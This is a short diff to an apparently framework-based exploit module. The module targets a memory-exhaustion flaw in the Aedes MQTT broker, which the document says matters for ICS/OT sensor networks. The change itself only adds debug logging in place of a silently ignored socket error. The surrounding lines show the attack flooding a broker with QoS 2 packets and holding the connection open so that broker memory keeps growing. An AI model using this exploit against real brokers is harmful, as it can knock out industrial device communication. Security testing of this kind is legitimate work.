@@ -11,6 +11,7 @@ Fixed in Aedes 1.2.0
 Relevant for ICS/OT environments using MQTT for sensor/device communication.
 Reference: https://github.com/moscajs/aedes/security/advisories/GHSA-5jvp-3p2v-5qgf
 """
+import logging
 import socket
 import struct
 import time
@@ -148,8 +149,8 @@ class Exploit(Exploit):
                     s.settimeout(0.1)
                     s.recv(8)  # drain PUBREC
                     s.settimeout(None)
-                except OSError:
-                    pass
+                except OSError as e:
+                    logging.debug("Connection/IO error (non-fatal): %s", e)
 
             print_success(f"[GHSA-5jvp-3p2v-5qgf] Sent {self.packets} QoS 2 packets (~{self.packets * self.payload_kb}KB stored in broker)")
             print_info("[GHSA-5jvp-3p2v-5qgf] Keeping connection open - broker memory is accumulating...")
